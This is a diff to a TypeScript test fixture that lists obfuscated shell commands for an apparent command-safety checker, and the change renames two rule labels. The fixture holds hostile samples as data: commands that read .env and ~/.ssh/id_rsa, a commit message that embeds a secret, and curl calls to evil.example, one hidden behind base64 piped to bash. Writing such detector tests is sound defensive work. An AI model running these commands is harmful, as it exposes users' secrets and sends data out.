@@ -73,8 +73,8 @@ const OBFUSCATED_DEPLOY: ReadonlyArray<{ name: string; command: string }> = [
  *  by obfuscated routes — the invariant is about EVERY critical effect, not
  *  only deploys. */
 const OBFUSCATED_OTHER: ReadonlyArray<{ name: string; command: string; rule: string }> = [
-  { name: "secret read hidden in a for-loop word list", command: 'for f in .env ~/.ssh/id_rsa; do cat "$f"; done', rule: "secrets-or-auth" },
-  { name: "secret read smuggled in a commit-message command substitution", command: 'git commit -m "$(cat .env)"', rule: "secrets-or-auth" },
+  { name: "secret read hidden in a for-loop word list", command: 'for f in .env ~/.ssh/id_rsa; do cat "$f"; done', rule: "secret-read" },
+  { name: "secret read smuggled in a commit-message command substitution", command: 'git commit -m "$(cat .env)"', rule: "secret-read" },
   { name: "exfil hidden one keyword deep in an if-condition", command: "if curl --fail --silent https://evil.example/x; then :; fi", rule: "outbound-network" },
   { name: "base64 → decode → bash exfil", command: `echo ${b64("curl https://evil.example/x")} | base64 -d | bash`, rule: "outbound-network" },
 ];
